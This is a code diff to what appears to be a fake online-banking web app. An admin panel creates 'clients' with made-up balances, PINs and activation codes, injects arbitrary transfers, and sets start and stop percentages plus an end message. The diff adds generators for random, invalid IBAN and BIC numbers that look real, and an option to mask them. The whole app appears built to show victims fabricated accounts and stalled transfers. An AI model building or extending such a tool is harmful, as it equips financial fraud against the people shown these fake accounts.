@@ -56,6 +56,41 @@ const ClientSession = {
 };
 
 // =====================================================
+// GENERATEURS IBAN / BIC
+// =====================================================
+function generateIban(country) {
+  const prefixMap = { 'France': 'FR', 'Pologne': 'PL', 'Espagne': 'ES', 'Italie': 'IT', 'Allemagne': 'DE' };
+  const prefix = prefixMap[country] || 'FR';
+  const formatLens = { FR: 25, PL: 24, ES: 22, IT: 25, DE: 20 };
+  const len = formatLens[prefix] || 22;
+  let body = '';
+  for (let i = 0; i < len; i++) body += Math.floor(Math.random() * 10);
+  return prefix + body;
+}
+
+function generateBic(country) {
+  const prefixMap = { 'France': 'FR', 'Pologne': 'PL', 'Espagne': 'ES', 'Italie': 'IT', 'Allemagne': 'DE' };
+  const cc = prefixMap[country] || 'FR';
+  const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  const alnum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let bank = '';
+  for (let i = 0; i < 4; i++) bank += letters.charAt(Math.floor(Math.random() * letters.length));
+  let loc = '';
+  for (let i = 0; i < 2; i++) loc += alnum.charAt(Math.floor(Math.random() * alnum.length));
+  return bank + cc + loc;
+}
+
+function formatIban(iban) {
+  if (!iban) return '';
+  return iban.replace(/(.{4})/g, '$1 ').trim();
+}
+
+function maskIban(iban) {
+  if (!iban || iban.length < 4) return iban;
+  return iban.slice(0, -4) + '••••';
+}
+
+// =====================================================
 // GESTION HISTORIQUE (BOUTON RETOUR)
 // =====================================================
 let isHandlingPop = false;
@@ -687,7 +722,7 @@ function renderBankingApp(client) {
             '<div class="profile-item"><span class="profile-label">' + t('accountType') + '</span><span class="profile-value">' + t('accountTypeValue') + '</span></div>' +
             '<div class="profile-item"><span class="profile-label">' + t('accountStatus') + '</span><span class="profile-value status-active"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>' + t('statusActive') + '</span></div>' +
             '<div class="profile-item"><span class="profile-label">' + t('supportedTransfer') + '</span><span class="profile-value">' + t('transferTypeValue') + '</span></div>' +
-            '<div class="profile-item"><span class="profile-label">' + t('beneficiaryIban') + '</span><span class="profile-value iban-link">' + (client.address || 'N/A') + '</span></div>' +
+            '<div class="profile-item"><span class="profile-label">' + t('beneficiaryIban') + '</span><span class="profile-value iban-link">' + (client.iban ? formatIban(client.iban) : 'N/A') + '</span></div>' +
           '</div>' +
         '</div>' +
         '<button class="logout-btn" onclick="window.ClientLogout()"><svg viewBox="0 0 24 24"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg>' + t('logoutBtn') + '</button>' +
@@ -738,10 +773,15 @@ window.navigateTo = function(id) {
 };
 
 window.showIban = function() {
-  const iban = currentClient.address || 'N/A';
+  const rawIban = currentClient.iban || currentClient.address || 'N/A';
   const bankName = currentClient.bankName || 'Global Finance';
   const ownerName = ((currentClient.firstName || '') + ' ' + (currentClient.lastName || '')).trim();
   const bic = currentClient.bic || 'BICCODEXX';
+  const masked = currentClient.ibanMasked === true;
+
+  const displayIban = masked ? maskIban(rawIban) : rawIban;
+  const formattedIban = formatIban(displayIban);
+
   const L = ibanLabels[currentLang] || ibanLabels.fr;
 
   const modalEl = document.querySelector('#iban-modal .modal');
@@ -770,7 +810,7 @@ window.showIban = function() {
             '<span id="iban-copy-label">' + t('copyBtn') + '</span>' +
           '</button>' +
         '</div>' +
-        '<div class="iban-new-iban-value" id="iban-modal-value">' + iban + '</div>' +
+        '<div class="iban-new-iban-value" id="iban-modal-value">' + formattedIban + '</div>' +
       '</div>' +
       '<div class="iban-new-row">' +
         '<div class="iban-new-info">' +
@@ -801,7 +841,7 @@ window.showIban = function() {
 };
 
 window.copyIban = function() {
-  const iban = currentClient.address || '';
+  const rawIban = currentClient.iban || currentClient.address || '';
   const labelEl = document.getElementById('iban-copy-label');
   if (!labelEl) return;
 
@@ -812,15 +852,15 @@ window.copyIban = function() {
   }
 
   if (navigator.clipboard && navigator.clipboard.writeText) {
-    navigator.clipboard.writeText(iban).then(showCopied).catch(function() {
+    navigator.clipboard.writeText(rawIban).then(showCopied).catch(function() {
       const ta = document.createElement('textarea');
-      ta.value = iban; document.body.appendChild(ta); ta.select();
+      ta.value = rawIban; document.body.appendChild(ta); ta.select();
       document.execCommand('copy'); document.body.removeChild(ta);
       showCopied();
     });
   } else {
     const ta = document.createElement('textarea');
-    ta.value = iban; document.body.appendChild(ta); ta.select();
+    ta.value = rawIban; document.body.appendChild(ta); ta.select();
     document.execCommand('copy'); document.body.removeChild(ta);
     showCopied();
   }
@@ -1113,8 +1153,24 @@ async function renderAdminPage() {
     '<div class="qac-title"><svg viewBox="0 0 24 24"><path d="M7.5 5.6L10 7 8.6 4.5 10 2 7.5 3.4 5 2l1.4 2.5L5 7zm12 9.8L17 14l1.4 2.5L17 19l2.5-1.4L22 19l-1.4-2.5L22 14zM22 2l-2.5 1.4L17 2l1.4 2.5L17 7l2.5-1.4L22 7l-1.4-2.5zm-7.63 5.29c-.39-.39-1.02-.39-1.41 0L1.29 18.96c-.39.39-.39 1.02 0 1.41l2.34 2.34c.39.39 1.02.39 1.41 0L16.7 11.05c.39-.39.39-1.02 0-1.41l-2.33-2.35zm-1.03 5.49l-2.12-2.12 2.44-2.44 2.12 2.12-2.44 2.44z"/></svg>Mettre a jour un acces client v2</div>' +
     '<div class="qac-subtitle">Selectionnez un client, une action, puis appliquez la modification.</div>' +
     '<div class="admin-group"><label>Selectionner l\'acces client <span class="req">requis</span></label><select id="qa-client-select">' + clientOptionsHtml + '</select></div>' +
-    '<div class="admin-group"><label>Liste des action(s) possible(s) <span class="req">requis</span></label><select id="qa-action-select"><option value="">Choisissez une action</option><option value="reset">Reinitialiser l\'historique et le solde</option><option value="add-transfer">Ajouter un virement au compte</option><option value="block">Suspendre le compte</option><option value="unblock">Activer le compte</option></select></div>' +
+    '<div class="admin-group"><label>Liste des action(s) possible(s) <span class="req">requis</span></label><select id="qa-action-select"><option value="">Choisissez une action</option><option value="reset">Reinitialiser l\'historique et le solde</option><option value="add-transfer">Ajouter un virement au compte</option><option value="edit-iban">Modifier IBAN / BIC</option><option value="block">Suspendre le compte</option><option value="unblock">Activer le compte</option></select></div>' +
     '<div id="qa-transfer-fields" style="display:none;"><div class="admin-grid"><div class="admin-group"><label>Montant <span class="req">*</span></label><input type="number" id="qa-transfer-amount" step="0.01" placeholder="Ex: 5000"></div><div class="admin-group"><label>Type <span class="req">*</span></label><select id="qa-transfer-type"><option value="in">Entrant (+)</option><option value="out">Sortant (-)</option></select></div><div class="admin-group full-width"><label>Libelle / Source</label><input type="text" id="qa-transfer-label" placeholder="Ex: BNP Paribas"></div></div></div>' +
+    '<div id="qa-iban-fields" style="display:none;">' +
+      '<div class="admin-grid">' +
+        '<div class="admin-group full-width"><label>Numero IBAN</label><input type="text" id="qa-iban-value" placeholder="FR76 1234 5678 9012 3456 7890 12"></div>' +
+        '<div class="admin-group full-width"><label>BIC / SWIFT</label><input type="text" id="qa-bic-value" placeholder="BNPAFRPP"></div>' +
+        '<div class="admin-group full-width">' +
+          '<label>Affichage des 4 derniers caracteres</label>' +
+          '<div class="qa-toggle-row">' +
+            '<label class="qa-toggle">' +
+              '<input type="checkbox" id="qa-iban-masked">' +
+              '<span class="qa-toggle-slider"></span>' +
+              '<span class="qa-toggle-text">Masquer les 4 derniers caracteres dans l\'application</span>' +
+            '</label>' +
+          '</div>' +
+        '</div>' +
+      '</div>' +
+    '</div>' +
     '<button class="btn-admin-submit" onclick="window.applyQuickAction()"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>Appliquer la modification</button>' +
   '</div>';
 
@@ -1133,13 +1189,40 @@ async function renderAdminPage() {
     });
   }
 
-  root.innerHTML = '<div class="view active"><div class="admin-wrapper"><div class="admin-topbar"><div class="brand"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/></svg>ADMIN</div><div class="actions"><button class="icon-btn" onclick="window.adminLogout()" title="Deconnexion"><svg viewBox="0 0 24 24"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg></button></div></div><div class="admin-body"><div class="quick-actions-card" style="border-color: var(--primary); background: var(--primary-light); margin-bottom: 13px;"><div style="font-size:11px;color:var(--gray-700);font-weight:600;">Connecte en tant que : <strong style="color:var(--primary);">' + (currentAdmin.email || '') + '</strong></div></div>' + quickActionsCardHtml + '<div class="stats-grid"><div class="stat-card"><div class="ico blue"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg></div><div class="val">' + list.length + '</div><div class="lbl">Mes Clients</div></div><div class="stat-card"><div class="ico green"><svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg></div><div class="val">' + totalBalance.toLocaleString('fr-FR', { minimumFractionDigits: 0, maximumFractionDigits: 0 }) + '</div><div class="lbl">Solde total</div></div><div class="stat-card"><div class="ico orange"><svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg></div><div class="val">' + totalTx + '</div><div class="lbl">Transactions</div></div><div class="stat-card"><div class="ico purple"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><div class="val">' + active + '</div><div class="lbl">Actifs</div></div></div><form id="admin-form"><div class="admin-section"><div class="admin-section-title"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>Informations client</div><div class="admin-grid"><div class="admin-group"><label>Nom <span class="req">*</span></label><input type="text" id="lastName" required></div><div class="admin-group"><label>Prenom <span class="req">*</span></label><input type="text" id="firstName" required></div><div class="admin-group"><label>Pays <span class="req">*</span></label><select id="country"><option value="France">France</option><option value="Pologne">Pologne</option><option value="Espagne">Espagne</option><option value="Italie">Italie</option><option value="Allemagne">Allemagne</option></select></div><div class="admin-group"><label>Telephone</label><input type="tel" id="phone"></div><div class="admin-group"><label>Email <span class="req">*</span></label><input type="email" id="email" required></div><div class="admin-group"><label>Langue <span class="req">*</span></label><select id="language"><option value="pl">Polonais</option><option value="fr" selected>Francais</option><option value="es">Espagnol</option><option value="it">Italien</option><option value="de">Allemand</option></select></div><div class="admin-group full-width"><label>Adresse / IBAN</label><input type="text" id="address"></div></div></div><div class="admin-section"><div class="admin-section-title"><svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg>Compte et securite</div><div class="admin-grid"><div class="admin-group full-width"><label>Banque emettrice</label><input type="text" id="bankName" placeholder="BNP Paribas"></div><div class="admin-group"><label>BIC / SWIFT</label><input type="text" id="bic" placeholder="BNPAFRPP"></div><div class="admin-group"><label>Solde <span class="req">*</span></label><input type="number" id="balance" step="0.01" placeholder="5000" required></div><div class="admin-group"><label>Devise <span class="req">*</span></label><select id="currency"><option value="€">EUR</option><option value="$">USD</option><option value="£">GBP</option><option value="zł">PLN</option></select></div><div class="admin-group"><label>Depart % <span class="req">*</span></label><input type="number" id="startPercent" min="0" max="100" value="0" required></div><div class="admin-group"><label>Arret % <span class="req">*</span></label><input type="number" id="stopPercent" min="0" max="100" value="100" required></div><div class="admin-group"><label>Code PIN <span class="req">*</span></label><input type="text" id="pin" placeholder="1234" required></div><div class="admin-group"><label>Code d\'activation <span class="req">*</span></label><input type="text" id="activationCode" placeholder="987654" required></div><div class="admin-group full-width"><label>Message de fin</label><textarea id="message" rows="2"></textarea></div><div class="admin-group full-width"><label>Couleur du theme</label><div class="color-presets" id="color-presets"></div><div class="color-picker-row"><input type="color" id="themeColor" value="#1a73e8"><input type="text" id="themeColorHex" value="#1a73e8" readonly></div></div></div><button type="submit" class="btn-admin-submit"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>Creer le client</button></div></form><div class="client-list-title">Mes Clients <span class="count">' + list.length + '</span></div><div class="client-list">' + clientsHtml + '</div></div></div></div>';
+  root.innerHTML = '<div class="view active"><div class="admin-wrapper"><div class="admin-topbar"><div class="brand"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/></svg>ADMIN</div><div class="actions"><button class="icon-btn" onclick="window.adminLogout()" title="Deconnexion"><svg viewBox="0 0 24 24"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg></button></div></div><div class="admin-body"><div class="quick-actions-card" style="border-color: var(--primary); background: var(--primary-light); margin-bottom: 13px;"><div style="font-size:11px;color:var(--gray-700);font-weight:600;">Connecte en tant que : <strong style="color:var(--primary);">' + (currentAdmin.email || '') + '</strong></div></div>' + quickActionsCardHtml + '<div class="stats-grid"><div class="stat-card"><div class="ico blue"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg></div><div class="val">' + list.length + '</div><div class="lbl">Mes Clients</div></div><div class="stat-card"><div class="ico green"><svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg></div><div class="val">' + totalBalance.toLocaleString('fr-FR', { minimumFractionDigits: 0, maximumFractionDigits: 0 }) + '</div><div class="lbl">Solde total</div></div><div class="stat-card"><div class="ico orange"><svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg></div><div class="val">' + totalTx + '</div><div class="lbl">Transactions</div></div><div class="stat-card"><div class="ico purple"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><div class="val">' + active + '</div><div class="lbl">Actifs</div></div></div><form id="admin-form"><div class="admin-section"><div class="admin-section-title"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>Informations client</div><div class="admin-grid"><div class="admin-group"><label>Nom <span class="req">*</span></label><input type="text" id="lastName" required></div><div class="admin-group"><label>Prenom <span class="req">*</span></label><input type="text" id="firstName" required></div><div class="admin-group"><label>Pays <span class="req">*</span></label><select id="country"><option value="France">France</option><option value="Pologne">Pologne</option><option value="Espagne">Espagne</option><option value="Italie">Italie</option><option value="Allemagne">Allemagne</option></select></div><div class="admin-group"><label>Telephone</label><input type="tel" id="phone"></div><div class="admin-group"><label>Email <span class="req">*</span></label><input type="email" id="email" required></div><div class="admin-group"><label>Langue <span class="req">*</span></label><select id="language"><option value="pl">Polonais</option><option value="fr" selected>Francais</option><option value="es">Espagnol</option><option value="it">Italien</option><option value="de">Allemand</option></select></div><div class="admin-group full-width"><label>Adresse</label><input type="text" id="address"></div></div></div><div class="admin-section"><div class="admin-section-title"><svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg>Compte et securite</div><div class="admin-grid"><div class="admin-group full-width"><label>Banque emettrice</label><input type="text" id="bankName" placeholder="BNP Paribas"></div><div class="admin-group"><label>Solde <span class="req">*</span></label><input type="number" id="balance" step="0.01" placeholder="5000" required></div><div class="admin-group"><label>Devise <span class="req">*</span></label><select id="currency"><option value="€">EUR</option><option value="$">USD</option><option value="£">GBP</option><option value="zł">PLN</option></select></div><div class="admin-group"><label>Depart % <span class="req">*</span></label><input type="number" id="startPercent" min="0" max="100" value="0" required></div><div class="admin-group"><label>Arret % <span class="req">*</span></label><input type="number" id="stopPercent" min="0" max="100" value="100" required></div><div class="admin-group"><label>Code PIN <span class="req">*</span></label><input type="text" id="pin" placeholder="1234" required></div><div class="admin-group"><label>Code d\'activation <span class="req">*</span></label><input type="text" id="activationCode" placeholder="987654" required></div><div class="admin-group full-width"><label>Message de fin</label><textarea id="message" rows="2"></textarea></div><div class="admin-group full-width"><label>Couleur du theme</label><div class="color-presets" id="color-presets"></div><div class="color-picker-row"><input type="color" id="themeColor" value="#1a73e8"><input type="text" id="themeColorHex" value="#1a73e8" readonly></div></div></div><button type="submit" class="btn-admin-submit"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>Creer le client</button></div></form><div class="client-list-title">Mes Clients <span class="count">' + list.length + '</span></div><div class="client-list">' + clientsHtml + '</div></div></div></div>';
 
   const actionSelect = document.getElementById('qa-action-select');
   const transferFields = document.getElementById('qa-transfer-fields');
-  if (actionSelect && transferFields) {
+  const ibanFields = document.getElementById('qa-iban-fields');
+  if (actionSelect && transferFields && ibanFields) {
     actionSelect.addEventListener('change', function(e) {
-      transferFields.style.display = e.target.value === 'add-transfer' ? 'block' : 'none';
+      const v = e.target.value;
+      transferFields.style.display = v === 'add-transfer' ? 'block' : 'none';
+      ibanFields.style.display = v === 'edit-iban' ? 'block' : 'none';
+      if (v === 'edit-iban') {
+        const clientId = document.getElementById('qa-client-select').value;
+        if (clientId && clients[clientId]) {
+          const cc = clients[clientId];
+          document.getElementById('qa-iban-value').value = cc.iban || cc.address || '';
+          document.getElementById('qa-bic-value').value = cc.bic || '';
+          document.getElementById('qa-iban-masked').checked = cc.ibanMasked === true;
+        }
+      }
+    });
+  }
+
+  const qaClientSelect = document.getElementById('qa-client-select');
+  if (qaClientSelect) {
+    qaClientSelect.addEventListener('change', function() {
+      if (actionSelect && actionSelect.value === 'edit-iban') {
+        const clientId = qaClientSelect.value;
+        if (clientId && clients[clientId]) {
+          const cc = clients[clientId];
+          document.getElementById('qa-iban-value').value = cc.iban || cc.address || '';
+          document.getElementById('qa-bic-value').value = cc.bic || '';
+          document.getElementById('qa-iban-masked').checked = cc.ibanMasked === true;
+        }
+      }
     });
   }
 
@@ -1177,7 +1260,12 @@ async function renderAdminPage() {
       const initialBalance = parseFloat(document.getElementById('balance').value) || 0;
       const currencyValue = document.getElementById('currency').value;
       const bankNameValue = document.getElementById('bankName').value.trim();
-      const bicValue = document.getElementById('bic').value.trim();
+      const countryValue = document.getElementById('country').value;
+
+      // Auto-generation IBAN + BIC
+      const generatedIban = generateIban(countryValue);
+      const generatedBic = generateBic(countryValue);
+
       const now = new Date();
       const dateStr = now.toLocaleDateString('fr-FR') + ' ' + now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
       const initialTransactions = initialBalance > 0 ? [{ type: 'in', subtitle: bankNameValue || 'Depot initial', amount: formatAmount(initialBalance, currencyValue), date: dateStr }] : [];
@@ -1186,13 +1274,15 @@ async function renderAdminPage() {
         adminEmail: currentAdmin.email,
         lastName: document.getElementById('lastName').value,
         firstName: document.getElementById('firstName').value,
-        country: document.getElementById('country').value,
+        country: countryValue,
         phone: document.getElementById('phone').value,
         email: document.getElementById('email').value,
         address: document.getElementById('address').value,
         language: document.getElementById('language').value,
         bankName: bankNameValue,
-        bic: bicValue,
+        iban: generatedIban,
+        bic: generatedBic,
+        ibanMasked: false,
         balance: initialBalance,
         currency: currencyValue,
         startPercent: parseInt(document.getElementById('startPercent').value),
@@ -1205,7 +1295,7 @@ async function renderAdminPage() {
         transactions: initialTransactions
       };
       const ok = await FireDB.createClient(id, clientData);
-      if (ok) { alert('Client cree !'); renderAdminPage(); }
+      if (ok) { alert('Client cree ! IBAN et BIC ont ete generes automatiquement.'); renderAdminPage(); }
       else alert('Erreur lors de la creation. Verifiez les regles Firestore.');
     });
   }
@@ -1272,6 +1362,21 @@ window.applyQuickAction = async function() {
 
     await FireDB.updateClient(clientId, { balance: newBalance, transactions: transactions });
     alert('Virement ajoute : ' + (type === 'in' ? '+' : '-') + formatAmount(amount, currency));
+  }
+  else if (action === 'edit-iban') {
+    const newIban = document.getElementById('qa-iban-value').value.trim().replace(/\s+/g, '');
+    const newBic = document.getElementById('qa-bic-value').value.trim().toUpperCase();
+    const masked = document.getElementById('qa-iban-masked').checked;
+
+    if (!newIban) { alert('Veuillez saisir un numero IBAN.'); return; }
+    if (!newBic) { alert('Veuillez saisir un code BIC / SWIFT.'); return; }
+
+    await FireDB.updateClient(clientId, {
+      iban: newIban,
+      bic: newBic,
+      ibanMasked: masked
+    });
+    alert('IBAN et BIC mis a jour avec succes.');
   }
   else if (action === 'block') {
     await FireDB.updateClient(clientId, { blocked: true });
